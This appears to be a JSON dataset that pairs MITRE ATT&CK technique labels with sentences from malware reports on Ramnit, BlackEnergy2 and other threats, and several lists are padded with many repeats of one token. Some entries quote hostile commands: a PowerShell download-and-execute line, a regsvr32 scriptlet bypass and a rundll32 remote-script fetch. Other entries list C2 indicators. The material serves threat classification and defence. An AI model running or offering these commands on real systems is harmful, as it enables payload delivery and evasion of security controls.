    "After obtaining the unique ID from the C2 server, the Trojan calls the \u201cSetAbStatById\u201d method to notify the C2 server of its status of \u201c1\u201d to notify the server it had successfully received the filename and file data",
    "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications."
  ],
  "deobfuscate/decode files or information obfuscated files or information-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "obfuscated files or information"
    ],
    "sentances": [
      "Obfuscation Mechanism for the JScript Code The malicious JScript code obfuscation relies on two main techniques",
      "The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure",
      "The main function of the dropper All strings within the dropper, as well as the backdoor, are encrypted using a hardcoded RSA256 key",
      "After decrypting and decompressing the strings, we can trivially identify aspects of the PlugX configuration"
    ]
  },
  "data staged": [
    "The r1.log file stores information for exfiltration",
    "After Comnie has been copied to the %TEMP% directory, it will look for the presence of the \u2018DQuit.tmp\u2019 file in this path",
    "FeedBack.php validates the sender by User-Agent, saves the data in the \u201cRAR\u201d server directory and stores the metadata in the mssql database for later reference",
    "Log.php validates the sender by User-Agent, saves the data in the \u201cUP\u201d server directory and stores the metadata in the mssql database for later reference",
    "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection."
  ],
  "system binary proxy execution: rundll32": [
    "Note: aswrundll.exe is very similar to Microsoft\u2019s own rundll32.exe - it allows you to execute DLLs by calling their exported functions",
    "On the next step this file is executed by rundll32.exe via the KlpSvc export",
    "The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\\Environment\\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed",
    "The loader component is executed via RUNDLL32.EXE",
    "Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1",
    "If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe",
    "If the string is present, the malware executes the command RunDll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "rundll32.exe",
    "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) "
  ],
  "system binary proxy execution: regsvr32": [
    "It loads the module with parameter vShow set to zero, which opens the application with a hidden window.\u00a0 Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe",
    "regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.\u00a0  \u00a0The script attempts to load the malicious module using regsvr with the run function.\u00a0  Procmon shows the malicious module loaded to the Avast process",
    "The malicious modules in regsvr32.exe memory After the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded",
    "If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available",
    "The Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.\u00a0  The downloaded modules found in regsvr32.exe as detected by the Cybereason platform",
    "The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:       regsvr32.exe /s /n /u /i:%TEMP%\\12-B-366.txt scrobj.dll     The use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module",
    "After selecting a payload URL, the script will create copies of certutil and regsvr32 to the temp directory for later use",
    "8 Making a copy of certutil and regsvr32 Certutil.exe (a copy is renamed to certis.exe by the trojan) is normally used in a windows environment to manage certificates, but in this case, it is used by the second stylesheet to download the malware payloads",
    "11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits",
    "19-1 regsvr32 running the .dlls  Fig",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "regsvr32.exe",
    "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)"
  ],
  "regsvr32 software packing-multi": {
    "technique_names": [
      "system binary proxy execution: regsvr32",
      "obfuscated files or information: software packing"
    ],
    "sentances": [
      "Procmon shows the malicious module loaded using the regsvr32.exe process.\u00a0\u00a0 Phase two: Payload Analysis\u00a0 \u00a0 The only module the XSL script loads is Irdsnhrxxxfery64, which is packed using the UPX packer"
    ]
  },
  "obfuscated files or information: software packing": [
    "After unpacking the module, it is packed with an additional inner packer Pe123\\RPolyCryptor",
    "BlackEnergy2 was eventually seen downloading more crimeware plugins \u2013 a custom spam plugin and a banking information stealer custom plugin",
    "It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind",
    "Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits",
    "The PCODE of the virtual machine is packed with the aplib packer",
    "An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed",
    "While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed",
    "The MSIL file contains the packed core payload in its .Net resource section",
    "Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX",
    "Two modifications are made to UPX version 3.91:  The magic bytes UPX! in the UPX header are replaced with ASS7, The decompressed code and strings sections are XORed with 0x01",
    "Figure 6: Difference between a stock UPX packed file and the modified one A patch for UPX is available on ESET\u2019s malware-research Github repository that allows unpacking Keydnap\u2019s backdoor with the usual upx -d",
    "See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! \u2026or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn\u2019t show any similarities with previously known malware",
    "Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes",
    "(Source: Dell SecureWorks) In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards packed JavaScript code shown in Figure 9 to the end of a legitimate website's menu page",
    "First, the sample is UPX packed",
    "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  "
  ],
  "system information discovery system network configuration discovery account discovery-multi": {
    "technique_names": [
      "system information discovery",
      "system network configuration discovery",
      "account discovery"
    ],
    "sentances": [
      "It executes the other modules and collects initial information about the machine, including information about the network, locale, and the keyboard language.\u00a0  \u00a0The main module collecting information about the machine"
    ]
  },
  "process injection regsvr32-multi": {
    "technique_names": [
      "process injection",
      "system binary proxy execution: regsvr32"
    ],
    "sentances": [
      "Continuing Malicious Activity and Manipulating Additional Security Products After the module loads with regsvr32.exe, the Irdsnhrxxxfery64 module injects another module Irdsnhrxxxfery98, which was downloaded by the script into regsvr32.exe using the LoadLibraryExW() function",
      "Similar to the previous case, if Avast and aswrundll.exe are on the machine, Irdsnhrxxxfery98 will be injected into that process instead of regsvr32.exe.\u00a0  Irdsnhrxxxfery64 injecting lrdsnhrxxfery98"
    ]
  },
  "process hollowing process discovery-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "process discovery"
    ],
    "sentances": [
      "Irdsnhrxxxfery64 manipulation on userinit.exe & unins000.exe Injection Technique To Increase Stealthiness After locating one of the target processes, the malware uses Process Hollowing (MITRE Technique T1093) to evasively create a new process from a legitimate source",
      "The macro downloads a payload from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256: 84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running the following command line process:cmd.exe /c powershell -W Hidden (New-Object System.NeT.WeBClieNT).DownloadFile('http://lokipanelhostingpanel[.]gq/work/kh/1.exe','%Public%\\\\\\\\svchost32.exe');Start-Process '%Public%\\\\\\\\svchost32.exeThe macro then attempts to kill Microsoft Office and Windows Defender processes using the \u2018taskkill\u2019 command"
    ]
  },
  "clipboard data": [
    "Data Exfiltration The second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate",
    "Cadelspy\u2019s main payload contains its back door functionality, allowing the threat to carry out the following activities:  Log keystrokes and the titles of open windows Gather clipboard data and system information Steal printer information and any documents that were sent to be printed Record audio Capture screenshots and webcam photos  Cadelspy compresses all of the stolen data into a .cab file and uploads it to the attacker\u2019s C&C servers",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "Clipboard stealer ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    "OpenClipboard()  ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " GetClipboardData() ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " pbpaste ",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    " OnDrawClipboard",
    "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)"
  ],
  "process injection process discovery-multi": {
    "technique_names": ["process injection", "process discovery"],
    "sentances": [
      "Attack Flow and Exfiltration After injecting into the targeted processes, the modules continue their malicious activity through those processes",
      "Analyzing Gold Dragon As part of its initialization, Gold Dragon:  Builds its imports by dynamically loading multiple APIs from multiple libraries Gains debug privileges (\u201cSeDebugPrivilege\u201d) for its own process to read remote memory residing in other processes  The malware does not establish persistence for itself but for another component (if it is found) on the system:  The malware begins by looking for an instance of the Hangul word processor (HWP) running on the system",
      "By using this method, it will copy itself into a running Internet Explorer process in order to avoid detection by running as an independent process"
    ]
  },
  "standard application layer protocol custom cryptographic protocol binary padding web service exfiltration over command and control channel pass the hash uncommonly used port fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "encrypted channel",
      "obfuscated files or information: binary padding",
      "web service",
      "exfiltration over c2 channel",
      "use alternate authentication material: pass the hash",
      "non-standard port",
      "fallback channels",
      "non-standard port"
    ],
    "sentances": [
      "For more information on LOLbins in the wild,\u00a0read\u00a0our research into a different Trojan.\u00a0 LOLbins and Trojans: How the Ramnit Trojan Spreads via sLoad in a Cyberattack Indicators of CompromisE     SHA1 01782747C12Bf06A52704A144DB59FEC41B3CB36   Hash   NF-e513468.zip     SHA1 1F83403398964D4E8B6C70B171C51CD278909172   Hash   Script.js     SHA1 CE8BDB56CCAC55C6881701EBD39DA316EE7ED18D   Hash   lrdsnhrxxfery64.~     SHA1 926137A50f473BBD257CD19E207C1C9114F6B215   Hash   lrdsnhrxxfery98.~     SHA1 5579E03EB1DA076EF939196CB14F8B769F30A302   Hash   lrdsnhrxxferyb.jpg     SHA1 B2734835888756929EE3FF4DCDE85080CB299D2A   Hash   lrdsnhrxxferyc.jpg     SHA1 206352E13D601239E2D043D971EA6657C091071A   Hash   lrdsnhrxxferydwwn.gif     SHA1 EAE82A63A980998F8D388BCCE7D967F28309F593   Hash   lrdsnhrxxferydwwn.gif     SHA1 9CD5A399C9320CBFB87C9D1CAD3BC366FB12E54F   Hash   lrdsnhrxxferydx.gif     SHA1 206352E13D601239E2D043D971EA6657C091071A   Hash   lrdsnhrxxferye.jpg     SHA1 4CDE9A53A9A49D606BC89E74D47398A69E767056   Hash   lrdsnhrxxferyg.gif     SHA1 F99319B1B321AE9F2D1F0361BC756A43D25444CE   Hash   lrdsnhrxxferygx.gif     SHA1 B85C106B68ED410107f97A2CC38b7EC05353F1FA   Hash   lrdsnhrxxferyxa.~     SHA1 77809236FDF621ABE37B32BF073B0B893E9CE67A   Hash   lrdsnhrxxferyxb.~     SHA1 B85C106B68ED410107f97A2CC38b7EC05353F1fA   Hash   lrdsnhrxxferyxa.~     SHA1 C2F3350AC58DE900768032554C009C4A78C47CCC   Hash   r1.log     104.129.204[.]41   IP   C2     63.251.126[.]7   IP   C2     195.157.15[.]100   IP   C2     173.231.184[.]59   IP   C2     64.95.103[.]181   IP   C2     19analiticsx00220a[.]com   Domain   C2     qnccmvbrh.wilstonbrwsaq[.]pw   Domain   C2"
    ]
  },
  "network service discovery": [
    "Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:  Config with a similar set of plugins for different architectures Here is the list of retrieved files and related functionality:    weap DDoS Attack (various types)   ps password stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)   nm scans ports, stores banners   snif logs IP source and destination, TCP/UDP ports   hook main module: CnC communication, config parser, plugins loader   uper rewrites hook module with a new version and launches it     Weap, Snif, Nm plugin grammar mistakes and mis-spellings The developers\u2019 coding style differed across the \u2018Hook\u2019 main module, the plugins, and the Windows main.dll",
    "Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\\16)",
    "Mimikatz The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in commonly exploited by EternalBlue to move laterally to other systems on the network.",
    "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)"
  ],
  "execution through api file deletion remote file copy-multi": {
    "technique_names": [
      "native api",
      "indicator removal on host: file deletion",
      "ingress tool transfer"
    ],
    "sentances": [
      "Hook module structure After decrypting the strings, it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules:  The CNC\u2019s IP address in the Linux module This Linux module can process the following commands, some of which are similar to the Windows version:    die  delete all BlackEnergy2 files and system traces   kill  delete all BlackEnergy2 files and system traces and reboot   lexec  launch a command using bin/sh   rexec  download and launch file using \u2018fork/exec\u2019   update  rewrite self file   migrate  update the CnC server    Windows Plugins After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater\u00a0attention to new BE2 samples and associated CnCs"
    ]
  },
  "system service discovery file and directory discovery-multi": {
    "technique_names": [
      "system service discovery",
      "file and directory discovery"
    ],
    "sentances": [
      "Russia Ukraine Poland Lithuania Belarus Azerbaijan Kyrgyzstan Kazakhstan Iran Israel Turkey Libya Kuwait Taiwan Vietnam India Croatia Germany Belgium Sweden  Victim profiles point to an expansive interest in ICS:  power generation site owners power facilities construction power generation operators large suppliers and manufacturers of heavy power related materials investors  However, we also noticed that\u00a0the target list includes government, property holding, and technology organizations as well:  high level government other ICS construction federal land holding agencies municipal offices federal emergency services space and earth measurement and assessment labs national standards body banks high-tech\u00a0transportation academic research  Victim cases We gained insight into significant BE2 victim profiles over the summer of 2014"
    ]
  },
  "data from local system file deletion connection proxy data staged remote file copy-multi": {
    "technique_names": [
      "data from local system",
      "indicator removal on host: file deletion",
      "proxy",
      "data staged",
      "ingress tool transfer"
    ],
    "sentances": [
      "The config files within BE2 contained the settings of the company\u2019s internal web proxy:  BE2 config file contains victim\u2019s internal proxy As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in older versions \u2013 all plugins were only in-memory), the administrators were able to collect BE2 files from the infected machines"
    ]
  },
  "system service discovery masquerading data staged-multi": {
    "technique_names": [
      "system service discovery",
      "masquerading",
      "data staged"
    ],
    "sentances": [
      "They are consistent and\u00a0serve as stable\u00a0IoC: %system32%driverswinntd_.dat %system32%driverswinntd.dat %system32%driverswincache.dat %system32%driversmlang.dat %system32%driversosver32nt.dat %LOCALAPPDATA%adobewind002.dat %LOCALAPPDATA%adobesettings.sol %LOCALAPPDATA%adobewinver.dat %LOCALAPPDATA%adobecache.dat BE2 also uses start menu locations for persistence: UsersuserAppDataRoamingMicrosoftWindowsStart MenuProgramsStartupflashplayerapp.exe BE3 uses the following known filenames: %USERPROFILE%NTUSER.LOG %LOCALAPPDATA%FONTCACHE.DAT BE2 MD5s: d57ccbb25882b16198a0f43285dafbb4 7740a9e5e3feecd3b7274f929d37bccf 948cd0bf83a670c05401c8b67d2eb310 f2be8c6c62be8f459d4bb7c2eb9b9d5e 26a10fa32d0d7216c8946c8d83dd3787 8c51ba91d26dd34cf7a223eaa38bfb03 c69bfd68107ced6e08fa22f72761a869 3cd7b0d0d256d8ff8c962f1155d7ab64 298b9a6b1093e037e65da31f9ac1a807 d009c50875879bd2aefab3fa1e20be09 88b3f0ef8c80a333c7f68d9b45472b88 17b00de1c61d887b7625642bad9af954 27eddda79c79ab226b9b24005e2e9b6c 48937e732d0d11e99c68895ac8578374 82418d99339bf9ff69875a649238ac18 f9dcb0638c8c2f979233b29348d18447 72372ffac0ee73dc8b6d237878e119c1 c229a7d86a9e9a970d18c33e560f3dfc ef618bd99411f11d0aa5b67d1173ccdf 383c07e3957fd39c3d0557c6df615a1a 105586891deb04ac08d57083bf218f93 1deea42a0543ce1beeeeeef1ffb801e5 7d1e1ec1b1b0a82bd0029e8391b0b530 1f751bf5039f771006b41bdc24bfadd3 d10734a4b3682a773e5b6739b86d9b88 632bba51133284f9efe91ce126eda12d a22e08e643ef76648bec55ced182d2fe 04565d1a290d61474510dd728f9b5aae 3c1bc5680bf93094c3ffa913c12e528b 6a03d22a958d3d774ac5437e04361552 0217eb80de0e649f199a657aebba73aa 79cec7edf058af6e6455db5b06ccbc6e f8453697521766d2423469b53a233ca7 8a449de07bd54912d85e7da22474d3a9 3f9dc60445eceb4d5420bb09b9e03fbf 8f459ae20291f2721244465aa6a6f7b9 4b323d4320efa67315a76be2d77a0c83 035848a0e6ad6ee65a25be3483af86f2 90d8e7a92284789d2e15ded22d34ccc3 edb324467f6d36c7f49def27af5953a5 